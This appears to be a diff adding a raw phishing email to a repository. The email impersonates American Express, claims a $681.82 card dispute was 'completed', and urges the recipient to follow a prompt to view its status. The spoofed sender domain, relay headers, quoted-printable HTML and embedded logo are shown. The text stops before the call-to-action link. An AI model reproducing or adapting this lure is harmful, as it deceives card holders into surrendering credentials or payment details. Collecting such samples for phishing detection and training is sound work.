@@ -1,0 +1,374 @@
+Return-Path: <amx@secure.net>
+Received: from secure.net (114-33-162-3.hinet-ip.hinet.net [114.33.162.3])
+ by inbound-smtp.us-east-2.amazonaws.com with SMTP id nqaf75gguvcl61h1k9u52030ema32kupdrdkeu81
+ for zingerpie@kfcreview.com;
+ Thu, 16 Oct 2025 13:42:07 +0000 (UTC)
+Received-SPF: none (spfCheck: 114.33.162.3 is neither permitted nor denied by domain of secure.net) client-ip=114.33.162.3; envelope-from=amx@secure.net; helo=secure.net;
+Authentication-Results: amazonses.com;
+ spf=none (spfCheck: 114.33.162.3 is neither permitted nor denied by domain of secure.net) client-ip=114.33.162.3; envelope-from=amx@secure.net; helo=secure.net;
+ dmarc=none header.from=secure.net;
+X-SES-RECEIPT: AEFBQUFBQUFBQUFGN1RJYzQ4ZWVUU1pUKzlIOHdRQXZTY2Y5N2RvbTRudHZibStoM3R6OXFqc1hTa0tXRGNuVVpSQ0JRVmtlenZOd1VlWU5VT1lHeGM4dktzMDZPc2NiMUtpQVh1R2lUaU82KzZCdGxVRTU0bm8rVGJYT1JmK0c0UC9aOGk0aExMWDc1L0M5KzBJR1RzQ2xPYnhxS2JCbDZvaGlab1BkUGNBTldYenNhbGJUdnpyZDRMdmVrVE1sM1VrekM3U3JlQ1lxRWZMeE5Ick5zeHdrUGFmVGxhL1pyWUF3UjR3V0p1eVhVbHZjR2U0aGRRb1ZDMnZ5QVZuNUxRVU5jcG83M2NkaDBSUS9pMVZSa2g0K29XN3VhSFE5NXZCZkliR0FiaHUzaEN3eVRsanU5Y0E9PQ==
+X-SES-DKIM-SIGNATURE: a=rsa-sha256; q=dns/txt; b=rqQAT++EUJmsCH42WipCU1XvHNyjUrCdSol/rR2b4Mg53s87DSsqNGDEVzgDVlq46fiFp5SWIVoD/nR6xPydmJI/T+CEPKdJ6iad8bQRatwVlQ+xpP8kUGTjJVhn4zA+GY584hStYIjh+yosIcuGF/9zFIn5YClJqM9Y8DqAzmA=; c=relaxed/simple; s=ndjes4mrtuzus6qxu3frw3ubo3gpjndv; d=amazonses.com; t=1760622127; v=1; bh=WC0rYb9XFZiFbGBW1QiulQexPShPkDwYP+/1izZM1hc=; h=From:To:Cc:Bcc:Subject:Date:Message-ID:MIME-Version:Content-Type:X-SES-RECEIPT;
+From: American Express <amx@secure.net>
+To: zingerpie@kfcreview.com
+Subject: Completed: View Dispute Status
+Date: 16 Oct 2025 21:42:06 +0800
+Message-ID: <20251016214206.0500E185814988C5@secure.net>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<BODY>
+<TABLE class=3Dd00452cf828c1c2911c69f23ab30b8yiv8581792665nysz_nzyrs.nzyrsn=
+yrsnzysssynr style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial, helvetica, clean=
+, sans-serif; BORDER-TOP-COLOR: rgb(217,217,217); WIDTH: 650px; WHITE-SPACE=
+: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; WORD-BREAK: normal; BORD=
+ER-LEFT-COLOR: rgb(217,217,217); FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-=
+STYLE: normal; BORDER-BOTTOM-COLOR: rgb(217,217,217); ORPHANS: 2; WIDOWS: 2=
+; BORDER-RIGHT-COLOR: rgb(217,217,217);=20
+LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; f=
+ont-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-t=
+hickness: initial; text-decoration-style: initial; text-decoration-color: i=
+nitial" cellSpacing=3D0 cellPadding=3D0 align=3Dcenter bgColor=3D#ffffff bo=
+rder=3D0>
+<TBODY style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif">
+<TR style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif">
+<TD style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif; PADDING-BOTT=
+OM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0=
+px">
+<TABLE style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif; BORDER-TO=
+P-COLOR: rgb(217,217,217); WORD-BREAK: normal; BORDER-LEFT-COLOR: rgb(217,2=
+17,217); BORDER-BOTTOM-COLOR: rgb(217,217,217); BORDER-RIGHT-COLOR: rgb(217=
+,217,217)" cellSpacing=3D0 cellPadding=3D0 border=3D0>
+<TBODY style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif">
+<TR style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif">
+<TD style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif; PADDING-BOTT=
+OM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0=
+px" height=3D10 width=3D650>
+<TABLE style=3D"FONT-FAMILY: arial, sans-serif; BORDER-TOP-COLOR: rgb(217,2=
+17,217); WIDTH: 650px; BORDER-COLLAPSE: collapse; WORD-BREAK: normal; BORDE=
+R-LEFT-COLOR: rgb(217,217,217); BORDER-BOTTOM-COLOR: rgb(217,217,217); BORD=
+ER-RIGHT-COLOR: rgb(217,217,217)" cellSpacing=3D0 cellPadding=3D0 border=3D=
+0>
+<TBODY style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif">
+<TR style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif">
+<TD style=3D"FONT-SIZE: 0px; FONT-FAMILY: arial, sans-serif; BORDER-COLLAPS=
+E: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARG=
+IN: 0px; PADDING-RIGHT: 0px" vAlign=3Dtop width=3D"35%">
+<TABLE style=3D"FONT-FAMILY: arial, sans-serif; BORDER-TOP-COLOR: rgb(217,2=
+17,217); WIDTH: 227px; BORDER-COLLAPSE: collapse; WORD-BREAK: normal; BORDE=
+R-LEFT-COLOR: rgb(217,217,217); BORDER-BOTTOM-COLOR: rgb(217,217,217); BORD=
+ER-RIGHT-COLOR: rgb(217,217,217)" cellSpacing=3D0 cellPadding=3D0 border=3D=
+0>
+<TBODY style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif">
+<TR style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif">
+<TD style=3D"FONT-FAMILY: arial, sans-serif; WIDTH: 60px; BORDER-COLLAPSE: =
+collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN:=
+ 0px; PADDING-RIGHT: 0px" width=3D60>
+<A style=3D'FONT-FAMILY: helveticaneue, "helvetica neue", helvetica, arial,=
+ sans-serif; COLOR: rgb(0,119,255)' href=3D"https://click.member.americanex=
+press.com/?qs=3D1556fa1a83228de97848a028b3c146b136926ee7ce00c0d2a02652a543B=
+Wy88Aabm3fQdk1RFQY8FgqnFE7QWnC790f6fe85613aec068a16b2db8fba81" rel=3D"noope=
+ner noreferrer" target=3D_blank data-link-id=3D"5082"></A></TD>
+<TD style=3D"FONT-FAMILY: arial, sans-serif; BORDER-COLLAPSE: collapse; PAD=
+DING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING=
+-RIGHT: 0px" width=3D12>&nbsp;</TD>
+<TD class=3Df9a3bccdd744a4cbd5b3P3d2JBzfmrkjj9NKR1LP7p9n2DcA8cJbp-tagline s=
+tyle=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif; BORDER-COLLAPSE: =
+collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN:=
+ 0px; PADDING-RIGHT: 0px" width=3D65>
+<A style=3D'FONT-FAMILY: helveticaneue, "helvetica neue", helvetica, arial,=
+ sans-serif; COLOR: rgb(0,119,255)' href=3D"https://click.member.americanex=
+press.com/?qs=3D1556fa1a83228de97848a028b3c146b136926ee7ce00c0d2a02652a543E=
+ufpsi9xL2f4NNzTCj91DPVFGYPjxQj790f6fe85613aec068a16b2db8fba81" rel=3D"noope=
+ner noreferrer" target=3D_blank data-link-id=3D"5083"></A></TD>
+<TD style=3D"FONT-FAMILY: arial, sans-serif; BORDER-COLLAPSE: collapse; PAD=
+DING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING=
+-RIGHT: 0px">&nbsp;</TD></TR></TBODY></TABLE></TD>
+<TD style=3D"FONT-FAMILY: arial, sans-serif; BORDER-COLLAPSE: collapse; PAD=
+DING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING=
+-RIGHT: 0px" vAlign=3Dtop width=3D"65%" align=3Dright>&nbsp;</TD></TR></TBO=
+DY></TABLE>
+<IMG style=3D"HEIGHT: 117px; WIDTH: 130px" alt=3D"American Express - Wikipe=
+dia"=20
+src=3D"data:image/png;base64,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
+7rn/wHIgSbYEjlaoAAAAABJRU5ErkJggg=3D=3D" width=3D224 height=3D221><BR class=
+=3Dbfdbee9f509e3b405d87b6f54572392ayiv8581792665Apple-interchange-newline s=
+tyle=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif">&nbsp;=20
+<TABLE style=3D"FONT-FAMILY: new; BORDER-TOP-COLOR: rgb(217,217,217); WIDTH=
+: 650px; WORD-SPACING: 0px; TEXT-TRANSFORM: none; WORD-BREAK: normal; BORDE=
+R-LEFT-COLOR: rgb(217,217,217); BORDER-BOTTOM-COLOR: rgb(217,217,217); BORD=
+ER-RIGHT-COLOR: rgb(217,217,217); TEXT-INDENT: 0px; text-decoration-color: =
+initial" cellSpacing=3D0 cellPadding=3D0>
+<TBODY style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif">
+<TR style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif">
+<TD style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif; WIDTH: 1849p=
+x; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; P=
+ADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(0,23,90)">
+<TABLE style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif; BORDER-TO=
+P-COLOR: rgb(217,217,217); WIDTH: 650px; WORD-BREAK: normal; BORDER-LEFT-CO=
+LOR: rgb(217,217,217); BORDER-BOTTOM-COLOR: rgb(217,217,217); BORDER-RIGHT-=
+COLOR: rgb(217,217,217)" cellSpacing=3D0 cellPadding=3D0>
+<TBODY style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif">
+<TR style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif">
+<TD style=3D"BORDER-TOP: rgb(0,23,90) 1pt solid; FONT-FAMILY: arial, helvet=
+ica, clean, sans-serif; BORDER-RIGHT: rgb(0,23,90) 1pt solid; WIDTH: 1847px=
+; BORDER-BOTTOM: rgb(0,23,90) 1pt solid; PADDING-BOTTOM: 0px; PADDING-TOP: =
+0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BACKGROUND-COLOR: =
+rgb(0,23,90)" colSpan=3D2>
+<P style=3D"FONT-SIZE: 10pt; FONT-FAMILY: arial; COLOR: black; PADDING-BOTT=
+OM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0=
+px">&nbsp;</P></TD></TR>
+<TR style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif">
+<TD style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif; WIDTH: 97px;=
+ PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PAD=
+DING-RIGHT: 0px; BACKGROUND-COLOR: rgb(0,23,90)">
+<P style=3D"FONT-SIZE: 10pt; FONT-FAMILY: arial; COLOR: black; PADDING-BOTT=
+OM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0=
+px">&nbsp;</P></TD>
+<TD style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif; WIDTH: 1752p=
+x; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; P=
+ADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(0,23,90)">
+<P style=3D"FONT-SIZE: 21px; FONT-FAMILY: arial; COLOR: white; PADDING-BOTT=
+OM: 0px; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px=
+; PADDING-RIGHT: 0px"><SPAN style=3D"FONT-SIZE: 21px; FONT-FAMILY: arial; W=
+HITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; F=
+ONT-WEIGHT: 400; COLOR: rgb(255,255,255); FONT-STYLE: normal; DISPLAY: inli=
+ne !important; BACKGROUND-COLOR: rgb(0,23,90); TEXT-INDENT: 0px; text-decor=
+ation-color: initial">Dear Card Member,</SPAN></P>
+</TD></TR>
+<TR style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif">
+<TD style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif; WIDTH: 97px;=
+ PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PAD=
+DING-RIGHT: 0px; BACKGROUND-COLOR: rgb(0,23,90)">
+<P style=3D"FONT-SIZE: 10pt; FONT-FAMILY: arial; COLOR: black; PADDING-BOTT=
+OM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0=
+px">&nbsp;</P></TD>
+<TD style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif; WIDTH: 1752p=
+x; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; P=
+ADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(0,23,90)">
+<P style=3D"FONT-SIZE: 5pt; FONT-FAMILY: arial; COLOR: black; PADDING-BOTTO=
+M: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0p=
+x">&nbsp;</P></TD></TR>
+<TR style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif">
+<TD style=3D"BORDER-TOP: rgb(0,23,90) 1pt solid; FONT-FAMILY: arial, helvet=
+ica, clean, sans-serif; BORDER-RIGHT: rgb(0,23,90) 1pt solid; WIDTH: 1847px=
+; BORDER-BOTTOM: rgb(0,23,90) 1pt solid; PADDING-BOTTOM: 0px; PADDING-TOP: =
+0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BACKGROUND-COLOR: =
+rgb(0,23,90)" colSpan=3D2>&nbsp;</TD></TR></TBODY></TABLE></TD></TR></TBODY=
+></TABLE>
+<TABLE style=3D"FONT-FAMILY: new; BORDER-TOP-COLOR: rgb(217,217,217); WIDTH=
+: 650px; WORD-SPACING: 0px; TEXT-TRANSFORM: none; WORD-BREAK: normal; BORDE=
+R-LEFT-COLOR: rgb(217,217,217); BORDER-BOTTOM-COLOR: rgb(217,217,217); BORD=
+ER-RIGHT-COLOR: rgb(217,217,217); TEXT-INDENT: 0px; text-decoration-color: =
+initial" cellSpacing=3D0 cellPadding=3D0>
+<TBODY style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif">
+<TR style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif">
+<TD style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif; WIDTH: 94px;=
+ PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PAD=
+DING-RIGHT: 0px">
+<P style=3D"FONT-SIZE: 10pt; FONT-FAMILY: arial; COLOR: black; PADDING-BOTT=
+OM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0=
+px">&nbsp;</P></TD>
+<TD style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif; WIDTH: 1648p=
+x; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; P=
+ADDING-RIGHT: 0px">
+<P style=3D"FONT-SIZE: 13pt; FONT-FAMILY: arial; COLOR: rgb(0,23,90); PADDI=
+NG-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-R=
+IGHT: 0px">&nbsp;</P></TD></TR></TBODY></TABLE></TD></TR>
+<TR style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif">
+<TD style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif; PADDING-BOTT=
+OM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0=
+px" bgColor=3D#ffffff><STRONG><FONT color=3D#00175a>zingerpie&nbsp;,</FONT>=
+</STRONG></TD></TR>
+<TR style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif">
+<TD style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif; PADDING-BOTT=
+OM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0=
+px" height=3D10>
+<P style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif; PADDING-BOTTO=
+M: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0p=
+x"><STRONG style=3D"FONT-SIZE: 17px; FONT-FAMILY: arial; WHITE-SPACE: norma=
+l; WORD-SPACING: 0px; TEXT-TRANSFORM: none; COLOR: rgb(0,23,90); FONT-STYLE=
+: normal; TEXT-ALIGN: center; TEXT-INDENT: 0px; text-decoration-color: init=
+ial"><BR>We have adjusted your&nbsp;payment options to reflect a disputed a=
+mount of $681.82.</STRONG></P>
+<P style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif; PADDING-BOTTO=
+M: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0p=
+x">&nbsp;</P></TD></TR>
+<TR style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif">
+<TD style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif; PADDING-BOTT=
+OM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0=
+px">
+<P style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif; PADDING-BOTTO=
+M: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0p=
+x" align=3Dleft><STRONG style=3D"FONT-SIZE: 17px; FONT-FAMILY: arial; WHITE=
+-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; COLOR: rgb(0,23,90=
+); FONT-STYLE: normal; TEXT-ALIGN: center; TEXT-INDENT: 0px; text-decoratio=
+n-color: initial">Follow the prompt below to view your dispute status.</STR=
+ONG></P></TD></TR>
+<TR style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif">
+<TD style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif; PADDING-BOTT=
+OM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0=
+px" height=3D10>&nbsp;</TD></TR>
+<TR style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif">
+<TD style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif; PADDING-BOTT=
+OM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0=
+px">
+<P style=3D"FONT-FAMILY: arial, helvetica, clean, sans-serif; PADDING-BOTTO=
+M: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0p=
